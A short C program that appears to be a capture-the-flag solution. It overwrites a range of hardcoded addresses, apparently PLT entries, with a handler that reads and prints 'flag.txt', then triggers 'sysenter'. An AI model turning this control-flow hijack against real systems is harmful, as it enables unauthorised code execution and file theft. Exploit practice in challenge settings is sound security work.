#include <sys/mman.h>

void plt_hndlr() {
    char buf[4096];
    int fd = sys_open("flag.txt",0,0);
    int len = sys_read(fd, buf, 4096);
    sys_write(1, buf, len);
    return;
}

int main() {
    volatile unsigned long *abort_plt = (unsigned long *)0x304a80140;
    for (;abort_plt <= (unsigned long *)0x304a80798; abort_plt++) {
        *(abort_plt) = (unsigned long)&plt_hndlr;
    }
    asm volatile("sysenter");
}

